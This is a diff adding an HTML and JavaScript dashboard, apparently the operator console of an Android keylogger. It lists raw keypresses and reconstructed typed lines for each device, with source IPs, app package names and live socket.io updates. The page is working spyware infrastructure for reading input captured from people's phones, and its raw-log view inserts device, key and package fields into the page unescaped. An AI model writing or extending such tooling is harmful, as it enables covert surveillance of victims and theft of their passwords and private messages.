@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log Dashboard</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
+    h1 { color: #333; }
+    .controls { display: flex; align-items: center; margin-bottom: 15px; }
+    .controls label { margin-right: 10px; font-weight: bold; }
+    select, button { padding: 6px 12px; margin-right: 10px; }
+    .section { background: #fff; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 20px; }
+    .section h2 { margin: 0; padding: 10px; background: #f0f0f0; border-bottom: 1px solid #ddd; font-size: 18px; }
+    .section-content { padding: 10px; max-height: 400px; overflow-y: auto; }
+    .line-entry { border-bottom: 1px solid #eee; padding: 8px 0; }
+    .line-text { font-weight: bold; font-size: 16px; }
+    .line-meta { color: #777; font-size: 12px; margin-top: 4px; }
+    .log-entry { border-bottom: 1px solid #eee; padding: 4px 0; font-size: 13px; }
+    .log-time { color: #777; margin-right: 8px; }
+    .log-ip { color: #999; margin-right: 8px; }
+    .device-highlight { color: #0066cc; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <h1>Android Log Dashboard</h1>
+  <div class="controls">
+    <label for="deviceSelect">Filter by device:</label>
+    <select id="deviceSelect">
+      <option value="">All devices</option>
+    </select>
+    <button onclick="clearAll()">Clear All Data</button>
+  </div>
+
+  <div class="section">
+    <h2>Reconstructed Lines</h2>
+    <div id="linesContainer" class="section-content"></div>
+  </div>
+
+  <div class="section">
+    <h2>Raw Keypress Logs</h2>
+    <div id="logsContainer" class="section-content"></div>
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const deviceSelect = document.getElementById('deviceSelect');
+    const logsContainer = document.getElementById('logsContainer');
+    const linesContainer = document.getElementById('linesContainer');
+
+    // Load devices
+    function loadDevices() {
+      fetch('/api/devices')
+        .then(r => r.json())
+        .then(devices => {
+          const current = deviceSelect.value;
+          deviceSelect.innerHTML = '<option value="">All devices</option>';
+          devices.forEach(d => {
+            const opt = document.createElement('option');
+            opt.value = d.device;
+            opt.textContent = `${d.device} (${d.logCount} logs, ${d.lineCount} lines)`;
+            deviceSelect.appendChild(opt);
+          });
+          deviceSelect.value = current;
+        })
+        .catch(e => console.error('Failed to load devices:', e));
+    }
+
+    // Load data based on selected device
+    function loadData() {
+      const device = deviceSelect.value;
+      const logUrl = device ? `/api/logs?device=${encodeURIComponent(device)}` : '/api/logs';
+      const lineUrl = device ? `/api/lines?device=${encodeURIComponent(device)}` : '/api/lines';
+
+      fetch(logUrl)
+        .then(r => r.json())
+        .then(logs => {
+          logsContainer.innerHTML = '';
+          logs.forEach(entry => addLogEntry(entry, false));
+        });
+
+      fetch(lineUrl)
+        .then(r => r.json())
+        .then(lines => {
+          linesContainer.innerHTML = '';
+          lines.forEach(line => addLineEntry(line));
+        });
+    }
+
+    // Add a raw log entry
+    function addLogEntry(entry, prepend = true) {
+      const div = document.createElement('div');
+      div.className = 'log-entry';
+      const device = entry.body && entry.body.device ? entry.body.device : 'unknown';
+      const key = entry.body && entry.body.key !== undefined ? entry.body.key : '';
+      const pkg = entry.body && entry.body.package ? entry.body.package : '';
+      div.innerHTML = `
+        <span class="log-time">${entry.timestamp}</span>
+        <span class="log-ip">${entry.ip}</span>
+        <span class="device-highlight">${device}</span> : ${key} <span style="color:#666">[${pkg}]</span>
+      `;
+      if (prepend) logsContainer.prepend(div); else logsContainer.appendChild(div);
+    }
+
+    // Add a reconstructed line
+    function addLineEntry(line) {
+      const div = document.createElement('div');
+      div.className = 'line-entry';
+      div.innerHTML = `
+        <div class="line-text">${escapeHtml(line.text)}</div>
+        <div class="line-meta">
+          <span class="device-highlight">${line.device}</span> | ${line.package} | ${line.startTime} → ${line.endTime} (${line.keyCount} keys)
+        </div>
+      `;
+      linesContainer.prepend(div);
+    }
+
+    function escapeHtml(text) {
+      const div = document.createElement('div');
+      div.textContent = text;
+      return div.innerHTML;
+    }
+
+    // Clear all data
+    function clearAll() {
+      if (!confirm('Clear all logs and lines?')) return;
+      fetch('/api/all', { method: 'DELETE' })
+        .then(() => {
+          logsContainer.innerHTML = '';
+          linesContainer.innerHTML = '';
+          loadDevices();
+        });
+    }
+
+    // Real-time updates
+    const socket = io();
+    socket.on('newLog', (entry) => {
+      const currentDevice = deviceSelect.value;
+      if (!currentDevice || (entry.body && entry.body.device === currentDevice)) {
+        addLogEntry(entry, true);
+      }
+      loadDevices();
+    });
+
+    socket.on('newLine', (line) => {
+      const currentDevice = deviceSelect.value;
+      if (!currentDevice || line.device === currentDevice) {
+        addLineEntry(line);
+      }
+      loadDevices();
+    });
+
+    socket.on('logsCleared', () => {
+      logsContainer.innerHTML = '';
+      linesContainer.innerHTML = '';
+      loadDevices();
+    });
+
+    deviceSelect.addEventListener('change', loadData);
+
+    // Initial load
+    loadDevices();
+    loadData();
+  </script>
+</body>
+</html>
